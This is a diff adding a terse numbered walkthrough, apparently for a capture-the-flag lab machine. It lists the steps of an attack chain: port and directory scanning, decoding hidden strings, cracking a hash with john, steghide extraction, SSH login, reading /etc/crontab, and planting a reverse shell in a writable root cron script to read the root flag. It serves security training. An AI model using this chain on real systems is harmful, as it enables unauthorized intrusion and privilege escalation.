@@ -1,0 +1,15 @@
+1 - nmap -A -p- 10.10.209.223
+2 - gobuster dir -u http://10.10.209.223 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+3 - gobuster dir -u http://10.10.209.223/hidden/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3 - view-source:http://10.10.209.223:65524/ -> BASE64 DECODE
+4 - view-source:http://10.10.209.223:65524/n0th1ng3ls3m4tt3r/
+5 - john hash -w=easypeasy.txt
+6 - wget http://10.10.209.223:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
+7 - steghide extract -sf binarycodepixabay.jpg
+8 - cat secrettext.txt -> BINARY DECODE
+9 - ssh -p 6498 boring@10.10.209.223
+10 - cat user.txt
+11 - cat /etc/crontab
+12 - nano /var/www/.mysecretcronjob.sh -> REVERSE_SHELL
+13 - whoami
+14 - cat /root/.root.txt
